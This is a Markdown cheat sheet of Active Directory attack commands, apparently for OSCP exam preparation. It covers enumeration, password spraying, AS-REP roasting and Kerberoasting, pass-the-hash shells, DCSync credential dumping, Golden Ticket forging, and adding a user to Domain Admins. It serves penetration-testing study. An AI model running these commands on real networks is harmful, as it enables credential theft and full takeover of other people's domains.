# 📝 OSCP AD Quick Reference

## 1. **Initial Enumeration**
```bash
nmap -p 88,135,139,389,445,636,3268,3389,5985 -sV TARGET
rpcclient -U "" -N TARGET   # enumdomusers, enumdomgroups
enum4linux-ng -A TARGET
```

---

## 2. **User & Credential Enumeration**
```bash
kerbrute userenum -d DOMAIN --dc-ip TARGET users.txt
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip TARGET   # AS-REP roast
crackmapexec smb TARGET -u users.txt -p 'Password123'      # spray
```

---

## 3. **Service Exploitation**
```bash
smbclient -L //TARGET/ -U "guest"
evil-winrm -i TARGET -u USER -p PASSWORD
xfreerdp /u:USER /p:PASSWORD /v:TARGET
```

---

## 4. **Privilege Escalation**
```bash
GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip TARGET -request   # Kerberoast
psexec.py DOMAIN/USER@TARGET -hashes LMHASH:NTHASH           # Pass-the-Hash
winPEAS.exe / Seatbelt.exe                                   # Local privesc
```

---

## 5. **Lateral Movement**
```bash
bloodhound-python -ip TARGET -u USER -p PASSWORD -d DOMAIN
wmiexec.py DOMAIN/USER:PASSWORD@TARGET
```

---

## 6. **Domain Dominance**
```bash
secretsdump.py DOMAIN/USER:PASSWORD@DC   # DCSync
mimikatz "kerberos::golden ..."          # Golden Ticket
net group "Domain Admins" USER /add /domain
```
